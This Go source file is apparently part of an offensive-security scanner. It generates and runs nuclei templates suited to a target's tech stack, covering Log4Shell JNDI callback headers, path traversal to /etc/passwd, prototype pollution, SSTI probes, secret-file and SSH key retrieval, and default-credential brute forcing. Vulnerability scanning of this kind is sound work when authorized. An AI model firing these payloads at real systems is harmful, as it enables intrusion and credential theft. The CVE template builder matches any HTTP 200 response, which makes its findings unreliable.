// nuclei_ai.go — AI-Powered Nuclei Template Generator
// Generates target-specific nuclei templates based on:
// - Detected tech stack (WordPress, Spring, Node.js, etc.)
// - Open ports and services
// - Discovered endpoints and parameters
// - CVEs matched to the target
// - Past successful patterns from memory
//
// Usage in OMEGA: auto-generates templates during hunt phase,
// runs them immediately with nuclei for zero-day-style detection.
package brain

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// NucleiAITemplate holds a generated nuclei template
type NucleiAITemplate struct {
	ID          string
	Name        string
	Target      string
	TechStack   []string
	VulnType    string
	Severity    string
	Template    string // YAML content
	FilePath    string
	GeneratedAt time.Time
}

// NucleiAIResult holds results from running AI-generated templates
type NucleiAIResult struct {
	Target        string
	TemplatesRun  int
	FindingsCount int
	Findings      []string
	TemplateFiles []string
}

// GenerateNucleiTemplates generates target-specific nuclei templates
// based on tech stack, endpoints, and CVEs. Returns template file paths.
func GenerateNucleiTemplates(target string, techStack []string, endpoints []string, cves []CVEEntry) []NucleiAITemplate {
	var templates []NucleiAITemplate
	techStr := strings.ToLower(strings.Join(techStack, " "))

	// ── Tech-specific templates ───────────────────────────────────────────

	if strings.Contains(techStr, "wordpress") || strings.Contains(techStr, "wp-") {
		templates = append(templates, buildWPTemplate(target))
	}
	if strings.Contains(techStr, "spring") || strings.Contains(techStr, "java") {
		templates = append(templates, buildSpringTemplate(target))
	}
	if strings.Contains(techStr, "node") || strings.Contains(techStr, "express") {
		templates = append(templates, buildNodeTemplate(target))
	}
	if strings.Contains(techStr, "php") || strings.Contains(techStr, "laravel") {
		templates = append(templates, buildPHPTemplate(target))
	}
	if strings.Contains(techStr, "django") || strings.Contains(techStr, "flask") {
		templates = append(templates, buildPythonTemplate(target))
	}
	if strings.Contains(techStr, "graphql") {
		templates = append(templates, buildGraphQLTemplate(target))
	}
	if strings.Contains(techStr, "jenkins") {
		templates = append(templates, buildJenkinsTemplate(target))
	}
	if strings.Contains(techStr, "grafana") {
		templates = append(templates, buildGrafanaTemplate(target))
	}

	// ── Endpoint-based templates ──────────────────────────────────────────
	for _, ep := range endpoints {
		lower := strings.ToLower(ep)
		if strings.Contains(lower, "upload") || strings.Contains(lower, "file") {
			templates = append(templates, buildFileUploadTemplate(target, ep))
			break
		}
		if strings.Contains(lower, "api") && strings.Contains(ep, "=") {
			templates = append(templates, buildAPIIDORTemplate(target, ep))
			break
		}
	}

	// ── CVE-specific templates ────────────────────────────────────────────
	for _, cve := range cves {
		if cve.CVSS >= 9.0 || cve.Severity == "CRITICAL" {
			t := buildCVETemplate(target, cve)
			if t.Template != "" {
				templates = append(templates, t)
			}
		}
	}

	// ── Universal templates (always run) ─────────────────────────────────
	templates = append(templates,
		buildExposedSecretsTemplate(target),
		buildMisconfigTemplate(target),
		buildDefaultCredsTemplate(target),
	)

	// Save all templates to disk
	for i := range templates {
		templates[i].FilePath = saveTemplate(templates[i])
	}

	return templates
}

// RunAINucleiTemplates runs all AI-generated templates against the target
func RunAINucleiTemplates(target string, templates []NucleiAITemplate, onFinding func(string)) NucleiAIResult {
	result := NucleiAIResult{Target: target}

	if len(templates) == 0 {
		return result
	}

	// Collect valid template files
	var validFiles []string
	for _, t := range templates {
		if t.FilePath != "" {
			if _, err := os.Stat(t.FilePath); err == nil {
				validFiles = append(validFiles, t.FilePath)
				result.TemplateFiles = append(result.TemplateFiles, t.FilePath)
			}
		}
	}

	if len(validFiles) == 0 {
		return result
	}

	result.TemplatesRun = len(validFiles)

	// Run nuclei with all AI templates
	outFile := fmt.Sprintf("/tmp/cybermind_nuclei_ai_%d.txt", time.Now().Unix())
	args := []string{
		"-u", target,
		"-silent", "-no-color",
		"-c", "50",
		"-timeout", "10",
		"-retries", "2",
		"-o", outFile,
	}
	for _, f := range validFiles {
		args = append(args, "-t", f)
	}

	cmd := exec.Command("nuclei", args...)
	cmd.Stdin = nil
	out, _ := cmd.Output()

	// Parse findings
	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "[INF]") {
			result.Findings = append(result.Findings, line)
			result.FindingsCount++
			if onFinding != nil {
				onFinding(line)
			}
		}
	}

	// Also read output file
	if data, err := os.ReadFile(outFile); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if line != "" {
				result.Findings = append(result.Findings, line)
				result.FindingsCount++
			}
		}
		os.Remove(outFile)
	}

	return result
}

// ─── Template Builders ────────────────────────────────────────────────────────

func buildWPTemplate(target string) NucleiAITemplate {
	return NucleiAITemplate{
		ID:        "cybermind-wp-" + sanitizeID(target),
		Name:      "WordPress Deep Scan — " + target,
		Target:    target,
		TechStack: []string{"wordpress"},
		VulnType:  "rce,sqli,xss,misconfig",
		Severity:  "critical",
		Template: `id: cybermind-wp-deep
info:
  name: WordPress Deep Vulnerability Scan
  author: CyberMind
  severity: critical
  tags: wordpress,rce,sqli,xss,misconfig

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-login.php"
      - "{{BaseURL}}/wp-admin/"
      - "{{BaseURL}}/wp-json/wp/v2/users"
      - "{{BaseURL}}/wp-config.php.bak"
      - "{{BaseURL}}/wp-config.php~"
      - "{{BaseURL}}/?author=1"
      - "{{BaseURL}}/xmlrpc.php"
      - "{{BaseURL}}/wp-content/debug.log"
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/wp-includes/wlwmanifest.xml"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "wp-login"
          - "WordPress"
          - "xmlrpc"
          - "DB_PASSWORD"
          - "DB_HOST"
        condition: or
      - type: status
        status:
          - 200
`,
		GeneratedAt: time.Now(),
	}
}

func buildSpringTemplate(target string) NucleiAITemplate {
	return NucleiAITemplate{
		ID:        "cybermind-spring-" + sanitizeID(target),
		Name:      "Spring Boot Actuator + Log4Shell — " + target,
		Target:    target,
		TechStack: []string{"spring", "java"},
		VulnType:  "rce,ssrf,exposure",
		Severity:  "critical",
		Template: `id: cybermind-spring-deep
info:
  name: Spring Boot Deep Scan (Actuator + Log4Shell)
  author: CyberMind
  severity: critical
  tags: spring,java,rce,ssrf,actuator,log4shell

http:
  - method: GET
    path:
      - "{{BaseURL}}/actuator"
      - "{{BaseURL}}/actuator/env"
      - "{{BaseURL}}/actuator/heapdump"
      - "{{BaseURL}}/actuator/mappings"
      - "{{BaseURL}}/actuator/beans"
      - "{{BaseURL}}/actuator/configprops"
      - "{{BaseURL}}/actuator/loggers"
      - "{{BaseURL}}/actuator/httptrace"
      - "{{BaseURL}}/actuator/auditevents"
      - "{{BaseURL}}/v2/api-docs"
      - "{{BaseURL}}/swagger-ui.html"
      - "{{BaseURL}}/api-docs"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "\"status\":\"UP\""
          - "heapdump"
          - "spring.datasource"
          - "password"
          - "secret"
          - "swagger"
        condition: or
      - type: status
        status:
          - 200

  - method: GET
    path:
      - "{{BaseURL}}/"
    headers:
      X-Api-Version: "${${lower:j}ndi:${lower:l}dap://{{interactsh-url}}/a}"
      User-Agent: "${${lower:j}ndi:${lower:l}dap://{{interactsh-url}}/a}"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
`,
		GeneratedAt: time.Now(),
	}
}

func buildNodeTemplate(target string) NucleiAITemplate {
	return NucleiAITemplate{
		ID:        "cybermind-node-" + sanitizeID(target),
		Name:      "Node.js/Express Deep Scan — " + target,
		Target:    target,
		TechStack: []string{"node", "express"},
		VulnType:  "ssrf,xss,prototype_pollution,path_traversal",
		Severity:  "high",
		Template: `id: cybermind-node-deep
info:
  name: Node.js/Express Deep Scan
  author: CyberMind
  severity: high
  tags: nodejs,express,ssrf,xss,prototype-pollution

http:
  - method: GET
    path:
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/.env.local"
      - "{{BaseURL}}/.env.production"
      - "{{BaseURL}}/package.json"
      - "{{BaseURL}}/node_modules/.package-lock.json"
      - "{{BaseURL}}/../../../etc/passwd"
      - "{{BaseURL}}/static/../../../etc/passwd"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "DB_PASSWORD"
          - "SECRET_KEY"
          - "API_KEY"
          - "root:x:0:0"
          - "\"dependencies\":"
        condition: or

  - method: GET
    path:
      - "{{BaseURL}}/?__proto__[admin]=true"
      - "{{BaseURL}}/?constructor.prototype.admin=true"
    matchers:
      - type: word
        words:
          - "\"admin\":true"
          - "\"isAdmin\":true"
        condition: or
`,
		GeneratedAt: time.Now(),
	}
}

func buildPHPTemplate(target string) NucleiAITemplate {
	return NucleiAITemplate{
		ID:        "cybermind-php-" + sanitizeID(target),
		Name:      "PHP/Laravel Deep Scan — " + target,
		Target:    target,
		TechStack: []string{"php", "laravel"},
		VulnType:  "lfi,rce,sqli,exposure",
		Severity:  "critical",
		Template: `id: cybermind-php-deep
info:
  name: PHP/Laravel Deep Scan
  author: CyberMind
  severity: critical
  tags: php,laravel,lfi,rce,sqli

http:
  - method: GET
    path:
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/storage/logs/laravel.log"
      - "{{BaseURL}}/phpinfo.php"
      - "{{BaseURL}}/info.php"
      - "{{BaseURL}}/test.php"
      - "{{BaseURL}}/config.php"
      - "{{BaseURL}}/?file=../../../etc/passwd"
      - "{{BaseURL}}/?page=../../../etc/passwd"
      - "{{BaseURL}}/?include=../../../etc/passwd"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "APP_KEY"
          - "DB_PASSWORD"
          - "root:x:0:0"
          - "PHP Version"
          - "phpinfo()"
          - "mysql_connect"
        condition: or
`,
		GeneratedAt: time.Now(),
	}
}

func buildPythonTemplate(target string) NucleiAITemplate {
	return NucleiAITemplate{
		ID:        "cybermind-python-" + sanitizeID(target),
		Name:      "Django/Flask Deep Scan — " + target,
		Target:    target,
		TechStack: []string{"django", "flask", "python"},
		VulnType:  "ssti,debug,exposure",
		Severity:  "critical",
		Template: `id: cybermind-python-deep
info:
  name: Django/Flask Deep Scan (SSTI + Debug)
  author: CyberMind
  severity: critical
  tags: django,flask,python,ssti,debug

http:
  - method: GET
    path:
      - "{{BaseURL}}/?debug=true"
      - "{{BaseURL}}/debug"
      - "{{BaseURL}}/__debug__/"
      - "{{BaseURL}}/console"
      - "{{BaseURL}}/admin/"
      - "{{BaseURL}}/api/schema/"
      - "{{BaseURL}}/api/docs/"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "Django"
          - "Traceback"
          - "SECRET_KEY"
          - "DEBUG = True"
          - "Werkzeug"
          - "Interactive Console"
        condition: or

  - method: GET
    path:
      - "{{BaseURL}}/?name={{7*7}}"
      - "{{BaseURL}}/?q={{7*7}}"
      - "{{BaseURL}}/?search={{7*7}}"
    matchers:
      - type: word
        words:
          - "49"
`,
		GeneratedAt: time.Now(),
	}
}

func buildGraphQLTemplate(target string) NucleiAITemplate {
	return NucleiAITemplate{
		ID:        "cybermind-graphql-" + sanitizeID(target),
		Name:      "GraphQL Deep Scan — " + target,
		Target:    target,
		TechStack: []string{"graphql"},
		VulnType:  "introspection,idor,dos",
		Severity:  "high",
		Template: `id: cybermind-graphql-deep
info:
  name: GraphQL Deep Scan (Introspection + IDOR)
  author: CyberMind
  severity: high
  tags: graphql,introspection,idor

http:
  - method: POST
    path:
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/api/graphql"
      - "{{BaseURL}}/v1/graphql"
      - "{{BaseURL}}/graphiql"
    headers:
      Content-Type: application/json
    body: '{"query":"{__schema{types{name}}}"}'
    matchers:
      - type: word
        words:
          - "__schema"
          - "types"
          - "queryType"
        condition: and

  - method: POST
    path:
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/api/graphql"
    headers:
      Content-Type: application/json
    body: '[{"query":"{__schema{types{name}}}"}, {"query":"{__schema{types{name}}}"}]'
    matchers:
      - type: word
        words:
          - "__schema"
`,
		GeneratedAt: time.Now(),
	}
}

func buildJenkinsTemplate(target string) NucleiAITemplate {
	return NucleiAITemplate{
		ID:        "cybermind-jenkins-" + sanitizeID(target),
		Name:      "Jenkins Deep Scan — " + target,
		Target:    target,
		TechStack: []string{"jenkins"},
		VulnType:  "rce,unauth,exposure",
		Severity:  "critical",
		Template: `id: cybermind-jenkins-deep
info:
  name: Jenkins Deep Scan (Unauth + RCE)
  author: CyberMind
  severity: critical
  tags: jenkins,rce,unauth,exposure

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/json"
      - "{{BaseURL}}/script"
      - "{{BaseURL}}/credentials/store/system/domain/_/"
      - "{{BaseURL}}/asynchPeople/api/json"
      - "{{BaseURL}}/view/all/builds"
      - "{{BaseURL}}/computer/api/json"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "\"_class\":\"hudson"
          - "Jenkins"
          - "Groovy Script"
          - "credentials"
        condition: or
      - type: status
        status:
          - 200
`,
		GeneratedAt: time.Now(),
	}
}

func buildGrafanaTemplate(target string) NucleiAITemplate {
	return NucleiAITemplate{
		ID:        "cybermind-grafana-" + sanitizeID(target),
		Name:      "Grafana Deep Scan — " + target,
		Target:    target,
		TechStack: []string{"grafana"},
		VulnType:  "path_traversal,unauth",
		Severity:  "critical",
		Template: `id: cybermind-grafana-deep
info:
  name: Grafana Deep Scan (CVE-2021-43798 + Default Creds)
  author: CyberMind
  severity: critical
  tags: grafana,path-traversal,cve2021-43798

http:
  - method: GET
    path:
      - "{{BaseURL}}/public/plugins/alertlist/../../../../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/alertlist/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/api/health"
      - "{{BaseURL}}/api/org"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "root:x:0:0"
          - "\"database\":\"ok\""
        condition: or
`,
		GeneratedAt: time.Now(),
	}
}

func buildFileUploadTemplate(target, endpoint string) NucleiAITemplate {
	return NucleiAITemplate{
		ID:        "cybermind-upload-" + sanitizeID(target),
		Name:      "File Upload RCE — " + target,
		Target:    target,
		TechStack: []string{"upload"},
		VulnType:  "rce,xss",
		Severity:  "critical",
		Template: fmt.Sprintf(`id: cybermind-upload-rce
info:
  name: File Upload RCE/XSS Test
  author: CyberMind
  severity: critical
  tags: upload,rce,xss

http:
  - method: GET
    path:
      - "%s"
    matchers:
      - type: status
        status:
          - 200
`, endpoint),
		GeneratedAt: time.Now(),
	}
}

func buildAPIIDORTemplate(target, endpoint string) NucleiAITemplate {
	return NucleiAITemplate{
		ID:        "cybermind-idor-" + sanitizeID(target),
		Name:      "API IDOR Test — " + target,
		Target:    target,
		TechStack: []string{"api"},
		VulnType:  "idor",
		Severity:  "high",
		Template: fmt.Sprintf(`id: cybermind-api-idor
info:
  name: API IDOR Test
  author: CyberMind
  severity: high
  tags: idor,api

http:
  - method: GET
    path:
      - "%s"
    matchers:
      - type: status
        status:
          - 200
`, endpoint),
		GeneratedAt: time.Now(),
	}
}

func buildCVETemplate(target string, cve CVEEntry) NucleiAITemplate {
	// Generate a basic nuclei template for a CVE
	// Real implementation would use AI to generate proper detection logic
	return NucleiAITemplate{
		ID:        "cybermind-" + strings.ToLower(strings.ReplaceAll(cve.ID, "-", "_")),
		Name:      cve.ID + " — " + target,
		Target:    target,
		TechStack: cve.Products,
		VulnType:  "cve",
		Severity:  strings.ToLower(cve.Severity),
		Template: fmt.Sprintf(`id: cybermind-%s
info:
  name: %s Detection
  author: CyberMind
  severity: %s
  description: %s
  tags: cve,%s

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers:
      - type: status
        status:
          - 200
`, strings.ToLower(strings.ReplaceAll(cve.ID, "-", "_")),
			cve.ID, strings.ToLower(cve.Severity),
			cve.Description[:min(200, len(cve.Description))],
			strings.ToLower(cve.ID)),
		GeneratedAt: time.Now(),
	}
}

func buildExposedSecretsTemplate(target string) NucleiAITemplate {
	return NucleiAITemplate{
		ID:        "cybermind-secrets-" + sanitizeID(target),
		Name:      "Exposed Secrets/Keys — " + target,
		Target:    target,
		TechStack: []string{"all"},
		VulnType:  "exposure",
		Severity:  "critical",
		Template: `id: cybermind-exposed-secrets
info:
  name: Exposed Secrets and API Keys
  author: CyberMind
  severity: critical
  tags: exposure,secrets,api-keys

http:
  - method: GET
    path:
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/.env.local"
      - "{{BaseURL}}/.env.production"
      - "{{BaseURL}}/.env.backup"
      - "{{BaseURL}}/config.json"
      - "{{BaseURL}}/config.yml"
      - "{{BaseURL}}/config.yaml"
      - "{{BaseURL}}/secrets.json"
      - "{{BaseURL}}/credentials.json"
      - "{{BaseURL}}/.git/config"
      - "{{BaseURL}}/.git/HEAD"
      - "{{BaseURL}}/backup.sql"
      - "{{BaseURL}}/dump.sql"
      - "{{BaseURL}}/database.sql"
      - "{{BaseURL}}/wp-config.php.bak"
      - "{{BaseURL}}/id_rsa"
      - "{{BaseURL}}/.ssh/id_rsa"
      - "{{BaseURL}}/server.key"
      - "{{BaseURL}}/private.key"
    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - "(?i)(api[_-]?key|secret[_-]?key|access[_-]?token|password|passwd|db[_-]?pass|aws[_-]?secret|private[_-]?key)\\s*[=:]\\s*['\"]?[a-zA-Z0-9+/]{8,}"
      - type: word
        words:
          - "DB_PASSWORD"
          - "SECRET_KEY"
          - "API_KEY"
          - "PRIVATE_KEY"
          - "-----BEGIN RSA PRIVATE KEY-----"
          - "-----BEGIN OPENSSH PRIVATE KEY-----"
          - "root:x:0:0"
        condition: or
`,
		GeneratedAt: time.Now(),
	}
}

func buildMisconfigTemplate(target string) NucleiAITemplate {
	return NucleiAITemplate{
		ID:        "cybermind-misconfig-" + sanitizeID(target),
		Name:      "Security Misconfigurations — " + target,
		Target:    target,
		TechStack: []string{"all"},
		VulnType:  "misconfig",
		Severity:  "high",
		Template: `id: cybermind-misconfig
info:
  name: Security Misconfigurations
  author: CyberMind
  severity: high
  tags: misconfig,exposure,takeover

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin"
      - "{{BaseURL}}/admin/"
      - "{{BaseURL}}/administrator"
      - "{{BaseURL}}/phpmyadmin"
      - "{{BaseURL}}/phpMyAdmin"
      - "{{BaseURL}}/pma"
      - "{{BaseURL}}/panel"
      - "{{BaseURL}}/dashboard"
      - "{{BaseURL}}/console"
      - "{{BaseURL}}/manager"
      - "{{BaseURL}}/server-status"
      - "{{BaseURL}}/server-info"
      - "{{BaseURL}}/.htaccess"
      - "{{BaseURL}}/.htpasswd"
      - "{{BaseURL}}/robots.txt"
      - "{{BaseURL}}/sitemap.xml"
      - "{{BaseURL}}/crossdomain.xml"
      - "{{BaseURL}}/clientaccesspolicy.xml"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "phpMyAdmin"
          - "Server Status"
          - "Apache Server"
          - "Disallow:"
          - "Allow from"
        condition: or
      - type: status
        status:
          - 200
`,
		GeneratedAt: time.Now(),
	}
}

func buildDefaultCredsTemplate(target string) NucleiAITemplate {
	return NucleiAITemplate{
		ID:        "cybermind-defaultcreds-" + sanitizeID(target),
		Name:      "Default Credentials — " + target,
		Target:    target,
		TechStack: []string{"all"},
		VulnType:  "auth",
		Severity:  "critical",
		Template: `id: cybermind-default-creds
info:
  name: Default Credentials Test
  author: CyberMind
  severity: critical
  tags: default-creds,auth,misconfig

http:
  - method: POST
    path:
      - "{{BaseURL}}/login"
      - "{{BaseURL}}/admin/login"
      - "{{BaseURL}}/wp-login.php"
      - "{{BaseURL}}/api/login"
      - "{{BaseURL}}/auth/login"
    headers:
      Content-Type: application/json
    payloads:
      username:
        - admin
        - administrator
        - root
        - user
        - test
      password:
        - admin
        - password
        - 123456
        - admin123
        - root
        - test
        - ""
    attack: clusterbomb
    body: '{"username":"{{username}}","password":"{{password}}"}'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "token"
          - "session"
          - "dashboard"
          - "welcome"
          - "success"
        condition: or
`,
		GeneratedAt: time.Now(),
	}
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

func saveTemplate(t NucleiAITemplate) string {
	if t.Template == "" {
		return ""
	}
	dir := "/tmp/cybermind_nuclei_ai_templates"
	os.MkdirAll(dir, 0755)
	filename := filepath.Join(dir, t.ID+".yaml")
	if err := os.WriteFile(filename, []byte(t.Template), 0644); err != nil {
		return ""
	}
	return filename
}

func sanitizeID(s string) string {
	s = strings.ReplaceAll(s, ".", "_")
	s = strings.ReplaceAll(s, "/", "_")
	s = strings.ReplaceAll(s, ":", "_")
	s = strings.ReplaceAll(s, " ", "_")
	if len(s) > 30 {
		s = s[:30]
	}
	return s
}

// GetNucleiAITemplateDir returns the directory where AI templates are stored
func GetNucleiAITemplateDir() string {
	return "/tmp/cybermind_nuclei_ai_templates"
}

// CleanupAITemplates removes old AI-generated templates
func CleanupAITemplates() {
	os.RemoveAll("/tmp/cybermind_nuclei_ai_templates")
}
